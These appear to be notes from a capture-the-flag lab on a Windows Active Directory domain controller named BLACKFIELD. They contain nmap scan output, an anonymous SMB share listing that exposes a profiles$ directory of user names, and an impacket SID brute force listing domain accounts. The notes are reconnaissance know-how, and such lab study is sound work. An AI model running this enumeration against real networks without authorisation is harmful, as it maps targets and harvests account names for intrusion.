## NMAP SCAN 
```
nmap -sSCV -p- 10.129.229.17 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-04 20:58 +0700
Nmap scan report for 10.129.229.17
Host is up (0.11s latency).
Not shown: 65526 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-05-04 15:32:52Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  tcpwrapped
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local, Site: Default-First-Site-Name)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-05-04T15:33:01
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: 1h29m59s
```


```
smbclient -L //10.129.229.17/ -U ''            
Password for [WORKGROUP\]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        forensic        Disk      Forensic / Audit share.
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        profiles$       Disk      
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.229.17 failed (Error NT_STATUS_IO_TIMEOUT)
Unable to connect with SMB1 -- no workgroup available
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ smbclient //10.129.229.17/profiles$ -U '' 
Password for [WORKGROUP\]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jun  3 23:47:12 2020
  ..                                  D        0  Wed Jun  3 23:47:12 2020
  AAlleni                             D        0  Wed Jun  3 23:47:11 2020
  ABarteski                           D        0  Wed Jun  3 23:47:11 2020
  ABekesz                             D        0  Wed Jun  3 23:47:11 2020
  ABenzies                            D        0  Wed Jun  3 23:47:11 2020
  ABiemiller                          D        0  Wed Jun  3 23:47:11 2020
  AChampken                           D        0  Wed Jun  3 23:47:11 2020
  ACheretei                           D        0  Wed Jun  3 23:47:11 2020
  ACsonaki                            D        0  Wed Jun  3 23:47:11 2020
  AHigchens                           D        0  Wed Jun  3 23:47:11 2020
  AJaquemai                           D        0  Wed Jun  3 23:47:11 2020
  AKlado                              D        0  Wed Jun  3 23:47:11 2020
  AKoffenburger                       D        0  Wed Jun  3 23:47:11 2020
  AKollolli                           D        0  Wed Jun  3 23:47:11 2020
  AKruppe                             D        0  Wed Jun  3 23:47:11 2020
  AKubale                             D        0  Wed Jun  3 23:47:11 2020
  ALamerz                             D        0  Wed Jun  3 23:47:11 2020
  AMaceldon                           D        0  Wed Jun  3 23:47:11 2020
  AMasalunga                          D        0  Wed Jun  3 23:47:11 2020
  ANavay                              D        0  Wed Jun  3 23:47:11 2020
  ANesterova                          D        0  Wed Jun  3 23:47:11 2020
  ANeusse                             D        0  Wed Jun  3 23:47:11 2020
  AOkleshen                           D        0  Wed Jun  3 23:47:11 2020
  APustulka                           D        0  Wed Jun  3 23:47:11 2020
  ARotella                            D        0  Wed Jun  3 23:47:11 2020
  ASanwardeker                        D        0  Wed Jun  3 23:47:11 2020
  AShadaia                            D        0  Wed Jun  3 23:47:11 2020
  ASischo                             D        0  Wed Jun  3 23:47:11 2020
  ASpruce                             D        0  Wed Jun  3 23:47:11 2020
  ATakach                             D        0  Wed Jun  3 23:47:11 2020
  ATaueg                              D        0  Wed Jun  3 23:47:11 2020
  ATwardowski                         D        0  Wed Jun  3 23:47:11 2020
  audit2020                           D        0  Wed Jun  3 23:47:11 2020
  AWangenheim                         D        0  Wed Jun  3 23:47:11 2020
  AWorsey                             D        0  Wed Jun  3 23:47:11 2020
  AZigmunt                            D        0  Wed Jun  3 23:47:11 2020
  BBakajza                            D        0  Wed Jun  3 23:47:11 2020
  BBeloucif                           D        0  Wed Jun  3 23:47:11 2020
  BCarmitcheal                        D        0  Wed Jun  3 23:47:11 2020
  BConsultant                         D        0  Wed Jun  3 23:47:11 2020
  BErdossy                            D        0  Wed Jun  3 23:47:11 2020
  BGeminski                           D        0  Wed Jun  3 23:47:11 2020
  BLostal                             D        0  Wed Jun  3 23:47:11 2020
  BMannise                            D        0  Wed Jun  3 23:47:11 2020
  BNovrotsky                          D        0  Wed Jun  3 23:47:11 2020
  BRigiero                            D        0  Wed Jun  3 23:47:11 2020
  BSamkoses                           D        0  Wed Jun  3 23:47:11 2020
  BZandonella                         D        0  Wed Jun  3 23:47:11 2020
  CAcherman                           D        0  Wed Jun  3 23:47:12 2020
  CAkbari                             D        0  Wed Jun  3 23:47:12 2020
  CAldhowaihi                         D        0  Wed Jun  3 23:47:12 2020
  CArgyropolous                       D        0  Wed Jun  3 23:47:12 2020
  CDufrasne                           D        0  Wed Jun  3 23:47:12 2020
  CGronk                              D        0  Wed Jun  3 23:47:11 2020
  Chiucarello                         D        0  Wed Jun  3 23:47:11 2020
  Chiuccariello                       D        0  Wed Jun  3 23:47:12 2020
  CHoytal                             D        0  Wed Jun  3 23:47:12 2020
  CKijauskas                          D        0  Wed Jun  3 23:47:12 2020
  CKolbo                              D        0  Wed Jun  3 23:47:12 2020
  CMakutenas                          D        0  Wed Jun  3 23:47:12 2020
  CMorcillo                           D        0  Wed Jun  3 23:47:11 2020
  CSchandall                          D        0  Wed Jun  3 23:47:12 2020
  CSelters                            D        0  Wed Jun  3 23:47:12 2020
  CTolmie                             D        0  Wed Jun  3 23:47:12 2020
  DCecere                             D        0  Wed Jun  3 23:47:12 2020
  DChintalapalli                      D        0  Wed Jun  3 23:47:12 2020
  DCwilich                            D        0  Wed Jun  3 23:47:12 2020
  DGarbatiuc                          D        0  Wed Jun  3 23:47:12 2020
  DKemesies                           D        0  Wed Jun  3 23:47:12 2020
  DMatuka                             D        0  Wed Jun  3 23:47:12 2020
  DMedeme                             D        0  Wed Jun  3 23:47:12 2020
  DMeherek                            D        0  Wed Jun  3 23:47:12 2020
  DMetych                             D        0  Wed Jun  3 23:47:12 2020
  DPaskalev                           D        0  Wed Jun  3 23:47:12 2020
  DPriporov                           D        0  Wed Jun  3 23:47:12 2020
  DRusanovskaya                       D        0  Wed Jun  3 23:47:12 2020
  DVellela                            D        0  Wed Jun  3 23:47:12 2020
  DVogleson                           D        0  Wed Jun  3 23:47:12 2020
  DZwinak                             D        0  Wed Jun  3 23:47:12 2020
  EBoley                              D        0  Wed Jun  3 23:47:12 2020
  EEulau                              D        0  Wed Jun  3 23:47:12 2020
  EFeatherling                        D        0  Wed Jun  3 23:47:12 2020
  EFrixione                           D        0  Wed Jun  3 23:47:12 2020
  EJenorik                            D        0  Wed Jun  3 23:47:12 2020
  EKmilanovic                         D        0  Wed Jun  3 23:47:12 2020
  ElKatkowsky                         D        0  Wed Jun  3 23:47:12 2020
  EmaCaratenuto                       D        0  Wed Jun  3 23:47:12 2020
  EPalislamovic                       D        0  Wed Jun  3 23:47:12 2020
  EPryar                              D        0  Wed Jun  3 23:47:12 2020
  ESachhitello                        D        0  Wed Jun  3 23:47:12 2020
  ESariotti                           D        0  Wed Jun  3 23:47:12 2020
  ETurgano                            D        0  Wed Jun  3 23:47:12 2020
  EWojtila                            D        0  Wed Jun  3 23:47:12 2020
  FAlirezai                           D        0  Wed Jun  3 23:47:12 2020
  FBaldwind                           D        0  Wed Jun  3 23:47:12 2020
  FBroj                               D        0  Wed Jun  3 23:47:12 2020
  FDeblaquire                         D        0  Wed Jun  3 23:47:12 2020
  FDegeorgio                          D        0  Wed Jun  3 23:47:12 2020
  FianLaginja                         D        0  Wed Jun  3 23:47:12 2020
  FLasokowski                         D        0  Wed Jun  3 23:47:12 2020
  FPflum                              D        0  Wed Jun  3 23:47:12 2020
  FReffey                             D        0  Wed Jun  3 23:47:12 2020
  GaBelithe                           D        0  Wed Jun  3 23:47:12 2020
  Gareld                              D        0  Wed Jun  3 23:47:12 2020
  GBatowski                           D        0  Wed Jun  3 23:47:12 2020
  GForshalger                         D        0  Wed Jun  3 23:47:12 2020
  GGomane                             D        0  Wed Jun  3 23:47:12 2020
  GHisek                              D        0  Wed Jun  3 23:47:12 2020
  GMaroufkhani                        D        0  Wed Jun  3 23:47:12 2020
  GMerewether                         D        0  Wed Jun  3 23:47:12 2020
  GQuinniey                           D        0  Wed Jun  3 23:47:12 2020
  GRoswurm                            D        0  Wed Jun  3 23:47:12 2020
  GWiegard                            D        0  Wed Jun  3 23:47:12 2020
  HBlaziewske                         D        0  Wed Jun  3 23:47:12 2020
  HColantino                          D        0  Wed Jun  3 23:47:12 2020
  HConforto                           D        0  Wed Jun  3 23:47:12 2020
  HCunnally                           D        0  Wed Jun  3 23:47:12 2020
  HGougen                             D        0  Wed Jun  3 23:47:12 2020
  HKostova                            D        0  Wed Jun  3 23:47:12 2020
  IChristijr                          D        0  Wed Jun  3 23:47:12 2020
  IKoledo                             D        0  Wed Jun  3 23:47:12 2020
  IKotecky                            D        0  Wed Jun  3 23:47:12 2020
  ISantosi                            D        0  Wed Jun  3 23:47:12 2020
  JAngvall                            D        0  Wed Jun  3 23:47:12 2020
  JBehmoiras                          D        0  Wed Jun  3 23:47:12 2020
  JDanten                             D        0  Wed Jun  3 23:47:12 2020
  JDjouka                             D        0  Wed Jun  3 23:47:12 2020
  JKondziola                          D        0  Wed Jun  3 23:47:12 2020
  JLeytushsenior                      D        0  Wed Jun  3 23:47:12 2020
  JLuthner                            D        0  Wed Jun  3 23:47:12 2020
  JMoorehendrickson                   D        0  Wed Jun  3 23:47:12 2020
  JPistachio                          D        0  Wed Jun  3 23:47:12 2020
  JScima                              D        0  Wed Jun  3 23:47:12 2020
  JSebaali                            D        0  Wed Jun  3 23:47:12 2020
  JShoenherr                          D        0  Wed Jun  3 23:47:12 2020
  JShuselvt                           D        0  Wed Jun  3 23:47:12 2020
  KAmavisca                           D        0  Wed Jun  3 23:47:12 2020
  KAtolikian                          D        0  Wed Jun  3 23:47:12 2020
  KBrokinn                            D        0  Wed Jun  3 23:47:12 2020
  KCockeril                           D        0  Wed Jun  3 23:47:12 2020
  KColtart                            D        0  Wed Jun  3 23:47:12 2020
  KCyster                             D        0  Wed Jun  3 23:47:12 2020
  KDorney                             D        0  Wed Jun  3 23:47:12 2020
  KKoesno                             D        0  Wed Jun  3 23:47:12 2020
  KLangfur                            D        0  Wed Jun  3 23:47:12 2020
  KMahalik                            D        0  Wed Jun  3 23:47:12 2020
  KMasloch                            D        0  Wed Jun  3 23:47:12 2020
  KMibach                             D        0  Wed Jun  3 23:47:12 2020
  KParvankova                         D        0  Wed Jun  3 23:47:12 2020
  KPregnolato                         D        0  Wed Jun  3 23:47:12 2020
  KRasmor                             D        0  Wed Jun  3 23:47:12 2020
  KShievitz                           D        0  Wed Jun  3 23:47:12 2020
  KSojdelius                          D        0  Wed Jun  3 23:47:12 2020
  KTambourgi                          D        0  Wed Jun  3 23:47:12 2020
  KVlahopoulos                        D        0  Wed Jun  3 23:47:12 2020
  KZyballa                            D        0  Wed Jun  3 23:47:12 2020
  LBajewsky                           D        0  Wed Jun  3 23:47:12 2020
  LBaligand                           D        0  Wed Jun  3 23:47:12 2020
  LBarhamand                          D        0  Wed Jun  3 23:47:12 2020
  LBirer                              D        0  Wed Jun  3 23:47:12 2020
  LBobelis                            D        0  Wed Jun  3 23:47:12 2020
  LChippel                            D        0  Wed Jun  3 23:47:12 2020
  LChoffin                            D        0  Wed Jun  3 23:47:12 2020
  LCominelli                          D        0  Wed Jun  3 23:47:12 2020
  LDruge                              D        0  Wed Jun  3 23:47:12 2020
  LEzepek                             D        0  Wed Jun  3 23:47:12 2020
  LHyungkim                           D        0  Wed Jun  3 23:47:12 2020
  LKarabag                            D        0  Wed Jun  3 23:47:12 2020
  LKirousis                           D        0  Wed Jun  3 23:47:12 2020
  LKnade                              D        0  Wed Jun  3 23:47:12 2020
  LKrioua                             D        0  Wed Jun  3 23:47:12 2020
  LLefebvre                           D        0  Wed Jun  3 23:47:12 2020
  LLoeradeavilez                      D        0  Wed Jun  3 23:47:12 2020
  LMichoud                            D        0  Wed Jun  3 23:47:12 2020
  LTindall                            D        0  Wed Jun  3 23:47:12 2020
  LYturbe                             D        0  Wed Jun  3 23:47:12 2020
  MArcynski                           D        0  Wed Jun  3 23:47:12 2020
  MAthilakshmi                        D        0  Wed Jun  3 23:47:12 2020
  MAttravanam                         D        0  Wed Jun  3 23:47:12 2020
  MBrambini                           D        0  Wed Jun  3 23:47:12 2020
  MHatziantoniou                      D        0  Wed Jun  3 23:47:12 2020
  MHoerauf                            D        0  Wed Jun  3 23:47:12 2020
  MKermarrec                          D        0  Wed Jun  3 23:47:12 2020
  MKillberg                           D        0  Wed Jun  3 23:47:12 2020
  MLapesh                             D        0  Wed Jun  3 23:47:12 2020
  MMakhsous                           D        0  Wed Jun  3 23:47:12 2020
  MMerezio                            D        0  Wed Jun  3 23:47:12 2020
  MNaciri                             D        0  Wed Jun  3 23:47:12 2020
  MShanmugarajah                      D        0  Wed Jun  3 23:47:12 2020
  MSichkar                            D        0  Wed Jun  3 23:47:12 2020
  MTemko                              D        0  Wed Jun  3 23:47:12 2020
  MTipirneni                          D        0  Wed Jun  3 23:47:12 2020
  MTonuri                             D        0  Wed Jun  3 23:47:12 2020
  MVanarsdel                          D        0  Wed Jun  3 23:47:12 2020
  NBellibas                           D        0  Wed Jun  3 23:47:12 2020
  NDikoka                             D        0  Wed Jun  3 23:47:12 2020
  NGenevro                            D        0  Wed Jun  3 23:47:12 2020
  NGoddanti                           D        0  Wed Jun  3 23:47:12 2020
  NMrdirk                             D        0  Wed Jun  3 23:47:12 2020
  NPulido                             D        0  Wed Jun  3 23:47:12 2020
  NRonges                             D        0  Wed Jun  3 23:47:12 2020
  NSchepkie                           D        0  Wed Jun  3 23:47:12 2020
  NVanpraet                           D        0  Wed Jun  3 23:47:12 2020
  OBelghazi                           D        0  Wed Jun  3 23:47:12 2020
  OBushey                             D        0  Wed Jun  3 23:47:12 2020
  OHardybala                          D        0  Wed Jun  3 23:47:12 2020
  OLunas                              D        0  Wed Jun  3 23:47:12 2020
  ORbabka                             D        0  Wed Jun  3 23:47:12 2020
  PBourrat                            D        0  Wed Jun  3 23:47:12 2020
  PBozzelle                           D        0  Wed Jun  3 23:47:12 2020
  PBranti                             D        0  Wed Jun  3 23:47:12 2020
  PCapperella                         D        0  Wed Jun  3 23:47:12 2020
  PCurtz                              D        0  Wed Jun  3 23:47:12 2020
  PDoreste                            D        0  Wed Jun  3 23:47:12 2020
  PGegnas                             D        0  Wed Jun  3 23:47:12 2020
  PMasulla                            D        0  Wed Jun  3 23:47:12 2020
  PMendlinger                         D        0  Wed Jun  3 23:47:12 2020
  PParakat                            D        0  Wed Jun  3 23:47:12 2020
  PProvencer                          D        0  Wed Jun  3 23:47:12 2020
  PTesik                              D        0  Wed Jun  3 23:47:12 2020
  PVinkovich                          D        0  Wed Jun  3 23:47:12 2020
  PVirding                            D        0  Wed Jun  3 23:47:12 2020
  PWeinkaus                           D        0  Wed Jun  3 23:47:12 2020
  RBaliukonis                         D        0  Wed Jun  3 23:47:12 2020
  RBochare                            D        0  Wed Jun  3 23:47:12 2020
  RKrnjaic                            D        0  Wed Jun  3 23:47:12 2020
  RNemnich                            D        0  Wed Jun  3 23:47:12 2020
  RPoretsky                           D        0  Wed Jun  3 23:47:12 2020
  RStuehringer                        D        0  Wed Jun  3 23:47:12 2020
  RSzewczuga                          D        0  Wed Jun  3 23:47:12 2020
  RVallandas                          D        0  Wed Jun  3 23:47:12 2020
  RWeatherl                           D        0  Wed Jun  3 23:47:12 2020
  RWissor                             D        0  Wed Jun  3 23:47:12 2020
  SAbdulagatov                        D        0  Wed Jun  3 23:47:12 2020
  SAjowi                              D        0  Wed Jun  3 23:47:12 2020
  SAlguwaihes                         D        0  Wed Jun  3 23:47:12 2020
  SBonaparte                          D        0  Wed Jun  3 23:47:12 2020
  SBouzane                            D        0  Wed Jun  3 23:47:12 2020
  SChatin                             D        0  Wed Jun  3 23:47:12 2020
  SDellabitta                         D        0  Wed Jun  3 23:47:12 2020
  SDhodapkar                          D        0  Wed Jun  3 23:47:12 2020
  SEulert                             D        0  Wed Jun  3 23:47:12 2020
  SFadrigalan                         D        0  Wed Jun  3 23:47:12 2020
  SGolds                              D        0  Wed Jun  3 23:47:12 2020
  SGrifasi                            D        0  Wed Jun  3 23:47:12 2020
  SGtlinas                            D        0  Wed Jun  3 23:47:12 2020
  SHauht                              D        0  Wed Jun  3 23:47:12 2020
  SHederian                           D        0  Wed Jun  3 23:47:12 2020
  SHelregel                           D        0  Wed Jun  3 23:47:12 2020
  SKrulig                             D        0  Wed Jun  3 23:47:12 2020
  SLewrie                             D        0  Wed Jun  3 23:47:12 2020
  SMaskil                             D        0  Wed Jun  3 23:47:12 2020
  Smocker                             D        0  Wed Jun  3 23:47:12 2020
  SMoyta                              D        0  Wed Jun  3 23:47:12 2020
  SRaustiala                          D        0  Wed Jun  3 23:47:12 2020
  SReppond                            D        0  Wed Jun  3 23:47:12 2020
  SSicliano                           D        0  Wed Jun  3 23:47:12 2020
  SSilex                              D        0  Wed Jun  3 23:47:12 2020
  SSolsbak                            D        0  Wed Jun  3 23:47:12 2020
  STousignaut                         D        0  Wed Jun  3 23:47:12 2020
  support                             D        0  Wed Jun  3 23:47:12 2020
  svc_backup                          D        0  Wed Jun  3 23:47:12 2020
  SWhyte                              D        0  Wed Jun  3 23:47:12 2020
  SWynigear                           D        0  Wed Jun  3 23:47:12 2020
  TAwaysheh                           D        0  Wed Jun  3 23:47:12 2020
  TBadenbach                          D        0  Wed Jun  3 23:47:12 2020
  TCaffo                              D        0  Wed Jun  3 23:47:12 2020
  TCassalom                           D        0  Wed Jun  3 23:47:12 2020
  TEiselt                             D        0  Wed Jun  3 23:47:12 2020
  TFerencdo                           D        0  Wed Jun  3 23:47:12 2020
  TGaleazza                           D        0  Wed Jun  3 23:47:12 2020
  TKauten                             D        0  Wed Jun  3 23:47:12 2020
  TKnupke                             D        0  Wed Jun  3 23:47:12 2020
  TLintlop                            D        0  Wed Jun  3 23:47:12 2020
  TMusselli                           D        0  Wed Jun  3 23:47:12 2020
  TOust                               D        0  Wed Jun  3 23:47:12 2020
  TSlupka                             D        0  Wed Jun  3 23:47:12 2020
  TStausland                          D        0  Wed Jun  3 23:47:12 2020
  TZumpella                           D        0  Wed Jun  3 23:47:12 2020
  UCrofskey                           D        0  Wed Jun  3 23:47:12 2020
  UMarylebone                         D        0  Wed Jun  3 23:47:12 2020
  UPyrke                              D        0  Wed Jun  3 23:47:12 2020
  VBublavy                            D        0  Wed Jun  3 23:47:12 2020
  VButziger                           D        0  Wed Jun  3 23:47:12 2020
  VFuscca                             D        0  Wed Jun  3 23:47:12 2020
  VLitschauer                         D        0  Wed Jun  3 23:47:12 2020
  VMamchuk                            D        0  Wed Jun  3 23:47:12 2020
  VMarija                             D        0  Wed Jun  3 23:47:12 2020
  VOlaosun                            D        0  Wed Jun  3 23:47:12 2020
  VPapalouca                          D        0  Wed Jun  3 23:47:12 2020
  WSaldat                             D        0  Wed Jun  3 23:47:12 2020
  WVerzhbytska                        D        0  Wed Jun  3 23:47:12 2020
  WZelazny                            D        0  Wed Jun  3 23:47:12 2020
  XBemelen                            D        0  Wed Jun  3 23:47:12 2020
  XDadant                             D        0  Wed Jun  3 23:47:12 2020
  XDebes                              D        0  Wed Jun  3 23:47:12 2020
  XKonegni                            D        0  Wed Jun  3 23:47:12 2020
  XRykiel                             D        0  Wed Jun  3 23:47:12 2020
  YBleasdale                          D        0  Wed Jun  3 23:47:12 2020
  YHuftalin                           D        0  Wed Jun  3 23:47:12 2020
  YKivlen                             D        0  Wed Jun  3 23:47:12 2020
  YKozlicki                           D        0  Wed Jun  3 23:47:12 2020
  YNyirenda                           D        0  Wed Jun  3 23:47:12 2020
  YPredestin                          D        0  Wed Jun  3 23:47:12 2020
  YSeturino                           D        0  Wed Jun  3 23:47:12 2020
  YSkoropada                          D        0  Wed Jun  3 23:47:12 2020
  YVonebers                           D        0  Wed Jun  3 23:47:12 2020
  YZarpentine                         D        0  Wed Jun  3 23:47:12 2020
  ZAlatti                             D        0  Wed Jun  3 23:47:12 2020
  ZKrenselewski                       D        0  Wed Jun  3 23:47:12 2020
  ZMalaab                             D        0  Wed Jun  3 23:47:12 2020
  ZMiick                              D        0  Wed Jun  3 23:47:12 2020
  ZScozzari                           D        0  Wed Jun  3 23:47:12 2020
  ZTimofeeff                          D        0  Wed Jun  3 23:47:12 2020
  ZWausik                             D        0  Wed Jun  3 23:47:12 2020

                5102079 blocks of size 4096. 1694545 blocks available

```

we can auth with no user and pass
profiles has users and cannot access anything else
```
impacket-lookupsid anonymous@10.129.229.17  
Impacket v0.13.0.dev0+20250919.210843.8426ec99 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Brute forcing SIDs at 10.129.229.17
[*] StringBinding ncacn_np:10.129.229.17[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-4194615774-2175524697-3563712290
498: BLACKFIELD\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: BLACKFIELD\Administrator (SidTypeUser)
501: BLACKFIELD\Guest (SidTypeUser)
502: BLACKFIELD\krbtgt (SidTypeUser)
512: BLACKFIELD\Domain Admins (SidTypeGroup)
513: BLACKFIELD\Domain Users (SidTypeGroup)
514: BLACKFIELD\Domain Guests (SidTypeGroup)
515: BLACKFIELD\Domain Computers (SidTypeGroup)
516: BLACKFIELD\Domain Controllers (SidTypeGroup)
517: BLACKFIELD\Cert Publishers (SidTypeAlias)
518: BLACKFIELD\Schema Admins (SidTypeGroup)
519: BLACKFIELD\Enterprise Admins (SidTypeGroup)
520: BLACKFIELD\Group Policy Creator Owners (SidTypeGroup)
521: BLACKFIELD\Read-only Domain Controllers (SidTypeGroup)
522: BLACKFIELD\Cloneable Domain Controllers (SidTypeGroup)
525: BLACKFIELD\Protected Users (SidTypeGroup)
526: BLACKFIELD\Key Admins (SidTypeGroup)
527: BLACKFIELD\Enterprise Key Admins (SidTypeGroup)
553: BLACKFIELD\RAS and IAS Servers (SidTypeAlias)
571: BLACKFIELD\Allowed RODC Password Replication Group (SidTypeAlias)
572: BLACKFIELD\Denied RODC Password Replication Group (SidTypeAlias)
1000: BLACKFIELD\DC01$ (SidTypeUser)
1101: BLACKFIELD\DnsAdmins (SidTypeAlias)
1102: BLACKFIELD\DnsUpdateProxy (SidTypeGroup)
1103: BLACKFIELD\audit2020 (SidTypeUser)
1104: BLACKFIELD\support (SidTypeUser)
1105: BLACKFIELD\BLACKFIELD764430 (SidTypeUser)
1106: BLACKFIELD\BLACKFIELD538365 (SidTypeUser)
1107: BLACKFIELD\BLACKFIELD189208 (SidTypeUser)
1108: BLACKFIELD\BLACKFIELD404458 (SidTypeUser)
1109: BLACKFIELD\BLACKFIELD706381 (SidTypeUser)
1110: BLACKFIELD\BLACKFIELD937395 (SidTypeUser)
1111: BLACKFIELD\BLACKFIELD553715 (SidTypeUser)
1112: BLACKFIELD\BLACKFIELD840481 (SidTypeUser)
1113: BLACKFIELD\BLACKFIELD622501 (SidTypeUser)
1114: BLACKFIELD\BLACKFIELD787464 (SidTypeUser)
1115: BLACKFIELD\BLACKFIELD163183 (SidTypeUser)
1116: BLACKFIELD\BLACKFIELD869335 (SidTypeUser)
1117: BLACKFIELD\BLACKFIELD319016 (SidTypeUser)
1118: BLACKFIELD\BLACKFIELD600999 (SidTypeUser)
1119: BLACKFIELD\BLACKFIELD894905 (SidTypeUser)
1120: BLACKFIELD\BLACKFIELD253541 (SidTypeUser)
1121: BLACKFIELD\BLACKFIELD175204 (SidTypeUser)
1122: BLACKFIELD\BLACKFIELD727512 (SidTypeUser)
1123: BLACKFIELD\BLACKFIELD227380 (SidTypeUser)
1124: BLACKFIELD\BLACKFIELD251003 (SidTypeUser)
1125: BLACKFIELD\BLACKFIELD129328 (SidTypeUser)
1126: BLACKFIELD\BLACKFIELD616527 (SidTypeUser)
1127: BLACKFIELD\BLACKFIELD533551 (SidTypeUser)
1128: BLACKFIELD\BLACKFIELD883784 (SidTypeUser)
1129: BLACKFIELD\BLACKFIELD908329 (SidTypeUser)
1130: BLACKFIELD\BLACKFIELD601590 (SidTypeUser)
1131: BLACKFIELD\BLACKFIELD573498 (SidTypeUser)
1132: BLACKFIELD\BLACKFIELD290325 (SidTypeUser)
1133: BLACKFIELD\BLACKFIELD775986 (SidTypeUser)
1134: BLACKFIELD\BLACKFIELD348433 (SidTypeUser)
1135: BLACKFIELD\BLACKFIELD196444 (SidTypeUser)
1136: BLACKFIELD\BLACKFIELD137694 (SidTypeUser)
1137: BLACKFIELD\BLACKFIELD533886 (SidTypeUser)
1138: BLACKFIELD\BLACKFIELD268320 (SidTypeUser)
1139: BLACKFIELD\BLACKFIELD909590 (SidTypeUser)
1140: BLACKFIELD\BLACKFIELD136813 (SidTypeUser)
1141: BLACKFIELD\BLACKFIELD358090 (SidTypeUser)
1142: BLACKFIELD\BLACKFIELD561870 (SidTypeUser)
1143: BLACKFIELD\BLACKFIELD269538 (SidTypeUser)
1144: BLACKFIELD\BLACKFIELD169035 (SidTypeUser)
1145: BLACKFIELD\BLACKFIELD118321 (SidTypeUser)
1146: BLACKFIELD\BLACKFIELD592556 (SidTypeUser)
1147: BLACKFIELD\BLACKFIELD618519 (SidTypeUser)
1148: BLACKFIELD\BLACKFIELD329802 (SidTypeUser)
1149: BLACKFIELD\BLACKFIELD753480 (SidTypeUser)
1150: BLACKFIELD\BLACKFIELD837541 (SidTypeUser)
1151: BLACKFIELD\BLACKFIELD186980 (SidTypeUser)
1152: BLACKFIELD\BLACKFIELD419600 (SidTypeUser)
1153: BLACKFIELD\BLACKFIELD220786 (SidTypeUser)
1154: BLACKFIELD\BLACKFIELD767820 (SidTypeUser)
1155: BLACKFIELD\BLACKFIELD549571 (SidTypeUser)
1156: BLACKFIELD\BLACKFIELD411740 (SidTypeUser)
1157: BLACKFIELD\BLACKFIELD768095 (SidTypeUser)
1158: BLACKFIELD\BLACKFIELD835725 (SidTypeUser)
1159: BLACKFIELD\BLACKFIELD251977 (SidTypeUser)
1160: BLACKFIELD\BLACKFIELD430864 (SidTypeUser)
1161: BLACKFIELD\BLACKFIELD413242 (SidTypeUser)
1162: BLACKFIELD\BLACKFIELD464763 (SidTypeUser)
1163: BLACKFIELD\BLACKFIELD266096 (SidTypeUser)
1164: BLACKFIELD\BLACKFIELD334058 (SidTypeUser)
1165: BLACKFIELD\BLACKFIELD404213 (SidTypeUser)
1166: BLACKFIELD\BLACKFIELD219324 (SidTypeUser)
1167: BLACKFIELD\BLACKFIELD412798 (SidTypeUser)
1168: BLACKFIELD\BLACKFIELD441593 (SidTypeUser)
1169: BLACKFIELD\BLACKFIELD606328 (SidTypeUser)
1170: BLACKFIELD\BLACKFIELD796301 (SidTypeUser)
1171: BLACKFIELD\BLACKFIELD415829 (SidTypeUser)
1172: BLACKFIELD\BLACKFIELD820995 (SidTypeUser)
1173: BLACKFIELD\BLACKFIELD695166 (SidTypeUser)
1174: BLACKFIELD\BLACKFIELD759042 (SidTypeUser)
1175: BLACKFIELD\BLACKFIELD607290 (SidTypeUser)
1176: BLACKFIELD\BLACKFIELD229506 (SidTypeUser)
1177: BLACKFIELD\BLACKFIELD256791 (SidTypeUser)
1178: BLACKFIELD\BLACKFIELD997545 (SidTypeUser)
1179: BLACKFIELD\BLACKFIELD114762 (SidTypeUser)
1180: BLACKFIELD\BLACKFIELD321206 (SidTypeUser)
1181: BLACKFIELD\BLACKFIELD195757 (SidTypeUser)
1182: BLACKFIELD\BLACKFIELD877328 (SidTypeUser)
1183: BLACKFIELD\BLACKFIELD446463 (SidTypeUser)
1184: BLACKFIELD\BLACKFIELD579980 (SidTypeUser)
1185: BLACKFIELD\BLACKFIELD775126 (SidTypeUser)
1186: BLACKFIELD\BLACKFIELD429587 (SidTypeUser)
1187: BLACKFIELD\BLACKFIELD534956 (SidTypeUser)
1188: BLACKFIELD\BLACKFIELD315276 (SidTypeUser)
1189: BLACKFIELD\BLACKFIELD995218 (SidTypeUser)
1190: BLACKFIELD\BLACKFIELD843883 (SidTypeUser)
1191: BLACKFIELD\BLACKFIELD876916 (SidTypeUser)
1192: BLACKFIELD\BLACKFIELD382769 (SidTypeUser)
1193: BLACKFIELD\BLACKFIELD194732 (SidTypeUser)
1194: BLACKFIELD\BLACKFIELD191416 (SidTypeUser)
1195: BLACKFIELD\BLACKFIELD932709 (SidTypeUser)
1196: BLACKFIELD\BLACKFIELD546640 (SidTypeUser)
1197: BLACKFIELD\BLACKFIELD569313 (SidTypeUser)
1198: BLACKFIELD\BLACKFIELD744790 (SidTypeUser)
1199: BLACKFIELD\BLACKFIELD739659 (SidTypeUser)
1200: BLACKFIELD\BLACKFIELD926559 (SidTypeUser)
1201: BLACKFIELD\BLACKFIELD969352 (SidTypeUser)
1202: BLACKFIELD\BLACKFIELD253047 (SidTypeUser)
1203: BLACKFIELD\BLACKFIELD899433 (SidTypeUser)
1204: BLACKFIELD\BLACKFIELD606964 (SidTypeUser)
1205: BLACKFIELD\BLACKFIELD385719 (SidTypeUser)
1206: BLACKFIELD\BLACKFIELD838710 (SidTypeUser)
1207: BLACKFIELD\BLACKFIELD608914 (SidTypeUser)
